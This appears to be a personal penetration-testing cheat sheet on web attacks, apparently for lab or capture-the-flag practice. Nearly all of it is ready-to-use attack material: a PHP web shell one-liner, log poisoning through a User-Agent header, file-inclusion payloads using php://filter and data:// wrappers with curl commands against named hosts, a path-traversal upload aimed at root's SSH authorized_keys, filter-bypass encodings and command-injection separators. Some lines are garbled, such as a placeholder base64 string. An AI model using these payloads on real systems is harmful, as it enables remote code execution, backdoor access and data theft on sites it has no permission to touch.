PHP Payload
<?php echo system($_GET["cmd"]);?>
# Send request to index.php
../../../logs.log&cmd=ls
# will pass the cmd command to poisoned log.
/usr/share/webshells/ have a lot of payloads on kali
simple-backdoor.php?cmd=cat%20/opt/install.txt
# above file uploaded function over http call

============= PHPWrappers =============
# When the <body> is not closed, can indicate content not being displayed, so we can use Wraper to get them

# php://filter
# can read and execute php files
curl http://superalexsec.com/xpto/index.php?page=php://filter/convert.base64-encode/resource=secret.php
# This call to php://filter will try the execution encoding in base64 the content.
echo "kaljsdfj23ij92jejfl==" | base64 -d
# will decode the answare

data://
# either plain text or base64-encoded data to include elements within the code of a running web application.
curl "http://superalexsec.com/meteor/index.php?page=data://text/plain,<?php%20echo%20system('whoami');?>"
# Will insert data on php and execute it
echo -n '<?php echo system($_GET["cmd"]);?>' | base64
666666239asjdkfqaw34==
curl "http://mountaindesserts.com/meteor/index.php?page=data://text/plain;base64,666666239asjdkfqaw34==&cmd=whoami"
# Will try to bypass filter using encoding, needs the cmd parameter with the command


============= Path traversal =============
/../../../../../../../../users/install.txt
curl --path-as-is
# help to not get trouble
Content-Disposition: form-data; name="myFile"; filename="../../../../../../../root/.ssh/authorized_keys"
# on Burp include file on stranges paths

curl@
index.php?page=data://text/plain;base64,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=uname%20-a
# encoded the <?php echo system($_GET["cmd"]);?> payload as Bas64 to bypass filter

====== LOGS =======
# Apache logs:
/var/log/apache/access.log
/var/log/apache2/access.log
/etc/httpd/logs/access_log
# IIS log path:
%SystemDrive%\inetpub\logs\LogFiles

Log Pollution
User-Agent: <?php echo system($_GET['cmd']); ?>
# Send request to index.php
../../../logs.log&cmd=ls
# will pass the cmd command to poisoned log.

======= FILTERS =======
Easy: case sensitive
URL Encondes:
%20: " "
%2e: "."
%3B: ";"

# filters with php can be also bypassed with less common extensios as php7 or phps

======= COMMAND INJECTION ==========
instead of using | to next cmd, try ;
git --version; cat flag.txt
# Chars with possible command injection
&
;
Newline (0x0a or \n)
&&
|
||
`command `
`command
$(command )


============= File Upload =============
# TIP: when return says that the file already exists, we can enumerate; when not, we can see error messages.
